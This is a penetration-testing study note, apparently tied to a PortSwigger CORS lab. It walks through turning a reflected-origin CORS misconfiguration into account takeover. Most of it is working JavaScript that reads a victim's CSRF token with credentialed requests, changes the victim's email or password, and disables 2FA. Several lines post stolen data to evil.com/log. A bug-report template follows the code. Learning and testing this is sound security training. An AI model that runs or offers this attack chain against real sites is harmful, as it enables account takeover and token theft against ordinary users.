---
tags: [vapt, cors, intermediate]
difficulty: intermediate
module: "12 - CORS"
topic: "12.10 CORS to Account Takeover Chain"
portswigger_labs: ["CORS vulnerability with basic origin reflection"]
---

# 12.10 — CORS to Account Takeover Chain

## The Full ATO Chain via CORS

```
CORS MISCONFIG → ATO FLOW:

1. Find CORS misconfiguration: ACAO reflects origin + ACAC: true
2. Find state-changing endpoint (change email, change password)
3. Two sub-paths:
   
   PATH A (No CSRF token):
     CORS misconfig → form-based CSRF → change email → password reset → ATO
   
   PATH B (CSRF token exists):
     CORS misconfig → read CSRF token from page → change email → password reset → ATO
   
   PATH C (API endpoint, no CSRF token needed):
     CORS misconfig → JSON fetch with credentials → change email → ATO

PREREQUISITE:
  The target must use cookie-based sessions (not token-in-header auth).
  Bearer token in Authorization header → CORS misconfig doesn't help for CSRF
                                          but still leaks response data!
```

---

## Chain Step 1 — Read CSRF Token

```javascript
// READ CSRF TOKEN FROM PROTECTED PAGE:
async function getCSRFToken(baseUrl) {
  const html = await fetch(`${baseUrl}/account/settings`, {
    credentials: 'include'
  }).then(r => r.text());
  
  // Try multiple token patterns:
  const patterns = [
    /name="csrf[_-]?token"\s+value="([^"]+)"/i,
    /name="_token"\s+value="([^"]+)"/i,
    /content="csrf-token"\s+name="([^"]+)"/i,
    /"csrf[_-]?token"\s*:\s*"([^"]+)"/i,
    /\[name=csrf\]\[value=([^\]]+)\]/i,
  ];
  
  for (const pattern of patterns) {
    const match = html.match(pattern);
    if (match) return match[1];
  }
  
  // Try from meta tag:
  const metaMatch = html.match(/<meta[^>]+name=['"]csrf-token['"][^>]+content=['"]([^'"]+)['"]/i);
  if (metaMatch) return metaMatch[1];
  
  console.log('CSRF token not found in HTML, trying API...');
  
  // Try from API response:
  try {
    const api = await fetch(`${baseUrl}/api/csrf-token`, {credentials: 'include'})
      .then(r => r.json());
    return api.token || api.csrf_token || api.csrfToken;
  } catch(e) {}
  
  return null;
}
```

---

## Chain Step 2 — Change Email

```javascript
// CHANGE EMAIL USING STOLEN CSRF TOKEN:
async function changeEmail(baseUrl, newEmail, csrfToken) {
  // Method 1: Form-encoded
  const formBody = new URLSearchParams({
    email: newEmail,
    csrf_token: csrfToken
  });
  
  let result = await fetch(`${baseUrl}/account/change-email`, {
    method: 'POST',
    credentials: 'include',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: formBody.toString()
  });
  
  if (result.ok || result.status === 302) return result.status;
  
  // Method 2: JSON body
  result = await fetch(`${baseUrl}/api/account/email`, {
    method: 'PUT',
    credentials: 'include',
    headers: { 
      'Content-Type': 'application/json',
      'X-CSRF-Token': csrfToken
    },
    body: JSON.stringify({ email: newEmail })
  });
  
  return result.status;
}
```

---

## Chain Step 3 — Full ATO

```javascript
// COMPLETE ATTACK FLOW:
const TARGET = 'https://target.com';
const ATTACKER_EMAIL = 'attacker@evil.com';

(async () => {
  console.log('[*] Step 1: Reading CSRF token...');
  const csrf = await getCSRFToken(TARGET);
  
  if (!csrf) {
    console.log('[!] No CSRF token — trying direct form submission...');
  }
  
  console.log('[*] Step 2: Changing victim email to', ATTACKER_EMAIL);
  const status = await changeEmail(TARGET, ATTACKER_EMAIL, csrf);
  console.log('[*] Email change status:', status);
  
  console.log('[*] Step 3: Notifying attacker...');
  await fetch('https://evil.com/log', {
    method: 'POST',
    body: JSON.stringify({ 
      step: 'email_changed', 
      to: ATTACKER_EMAIL,
      status: status,
      csrf_used: csrf
    })
  });
  
  console.log('[!] Now go to target.com/forgot-password and reset with', ATTACKER_EMAIL);
})();
```

---

## Alternative Chain — Change Password Directly

```javascript
// IF APP ALLOWS PASSWORD CHANGE WITHOUT CURRENT PASSWORD:
async function changePassword(baseUrl, newPassword, csrfToken) {
  const body = new URLSearchParams({
    new_password: newPassword,
    confirm_password: newPassword,
    csrf_token: csrfToken
  });
  
  const result = await fetch(`${baseUrl}/account/change-password`, {
    method: 'POST',
    credentials: 'include',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: body.toString()
  });
  
  return result.status;
}

// USAGE:
const csrf = await getCSRFToken('https://target.com');
const status = await changePassword('https://target.com', 'AttackerPass123!', csrf);
// Now attacker logs in with victim's username and new password!
```

---

## Chain — Disable 2FA Then Change Email

```javascript
// MULTI-STEP ATO:
async function fullATO(baseUrl) {
  const csrf = await getCSRFToken(baseUrl);
  
  // Step 1: Disable 2FA
  await fetch(`${baseUrl}/account/2fa/disable`, {
    method: 'POST',
    credentials: 'include',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: `csrf_token=${csrf}&confirm=yes`
  });
  
  // Brief wait for server to process
  await new Promise(r => setTimeout(r, 500));
  
  // Need fresh CSRF token after action
  const csrf2 = await getCSRFToken(baseUrl);
  
  // Step 2: Change email
  await changeEmail(baseUrl, 'attacker@evil.com', csrf2);
  
  // Step 3: Exfiltrate
  fetch('https://evil.com/log?step=full_ato_complete');
}
```

---

## CORS ATO via API Without CSRF Token

```javascript
// MANY REST APIs DON'T USE CSRF TOKENS (rely on Content-Type: JSON for protection)
// BUT: CORS misconfig allows us to make credentialed JSON requests!

async function apiATO(baseUrl) {
  // Check if JSON endpoint is accessible:
  const result = await fetch(`${baseUrl}/api/v1/user/email`, {
    method: 'PUT',
    credentials: 'include',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ email: 'attacker@evil.com' })
  });
  
  // With CORS reflection: ACAO: evil.com + ACAC: true
  // Preflight is approved!
  // Actual request goes through!
  // Email changed!
  
  return result.status;
}
```

---

## Proof of Concept Write-Up Template

```markdown
## CORS Misconfiguration → Account Takeover

**Severity:** Critical (CVSS 9.3)

**Affected Endpoint:** https://target.com/api/me and /account/change-email

**Vulnerability:** The server reflects any Origin header in 
Access-Control-Allow-Origin with credentials: true, allowing 
any origin to make authenticated requests and read responses.

**Steps to Reproduce:**
1. Log into target.com as victim@victim.com
2. Open the following HTML in a new browser tab:
   [CORS ATO ATTACK PAGE HTML]
3. Within 30 seconds, the victim's email changes to attacker@evil.com
4. Attacker visits target.com/forgot-password
5. Enters attacker@evil.com → receives reset link
6. Resets password → full account control

**Impact:**
Any user who can be tricked into visiting a malicious page 
(phishing link, malicious ad, etc.) is subject to full account 
takeover without any user interaction beyond visiting the page.

**Evidence:**
- Screenshot: Account email changed in victim profile
- Screenshot: Password reset email received at attacker@evil.com
- HTTP headers showing CORS misconfiguration:
  Origin: https://evil.com → ACAO: https://evil.com + ACAC: true
```

---

## Related Notes
- [[04 - Origin Reflection Misconfiguration]] — detecting the vulnerability
- [[09 - CORS to Credential Theft]] — stealing data
- [[Module 11 - CSRF]] — CSRF chains
- [[12 - Defense Strict Origin Whitelisting]] — defense
